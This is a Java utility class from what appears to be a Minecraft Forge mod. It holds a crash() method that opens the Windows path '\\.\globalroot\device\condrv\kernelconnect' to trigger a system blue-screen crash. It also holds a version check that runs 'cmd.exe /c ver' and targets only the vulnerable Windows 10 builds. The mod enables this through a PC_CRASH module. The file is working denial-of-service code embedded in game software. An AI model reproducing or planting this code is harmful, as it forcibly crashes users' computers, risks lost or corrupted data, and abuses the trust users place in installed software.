package com.qsoftware.forgemod.util;

import com.qsoftware.forgemod.Modules;
import com.qsoftware.forgemod.common.ModuleManager;
import lombok.experimental.UtilityClass;
import org.apache.commons.lang3.SystemUtils;

import java.io.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@UtilityClass
public class ComputerUtils {
    private static final Runtime runtime = Runtime.getRuntime();

    @SuppressWarnings("SpellCheckingInspection")
    public static void crash() {
        if (supportsCrash() && ModuleManager.getInstance().isEnabled(Modules.PC_CRASH)) {
            File file = new File("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
            try {
                FileInputStream stream = new FileInputStream(file);
                stream.close();
            } catch (IOException ignored) {

            }
        }
    }

    public static boolean supportsCrash() {
        if (SystemUtils.IS_OS_WINDOWS_10) {

            Process process;
            BufferedReader bufferedReader;
            StringBuilder stringBuilder = new StringBuilder();
            String stdOutLine;

            try {
                process = runtime.exec("cmd.exe /c ver");
                bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                while ((stdOutLine = bufferedReader.readLine()) != null) {
                    stringBuilder.append(stdOutLine);
                }
            } catch (IOException ex) {
                throw new RuntimeException("Error while getting Windows version");
            }

            System.out.println(stringBuilder.toString());


            Pattern pattern = Pattern.compile("10\\.0\\.([0-9]*)");
            Matcher matcher = pattern.matcher(stringBuilder.toString());
            if (matcher.find()) {
                String group = matcher.group(1);
                int integer = Integer.parseInt(group);
                return integer > 16299 && integer <= 19042;
            } else {
                throw new IllegalStateException("Invalid windows version!");
            }
        }
        return false;
    }
}
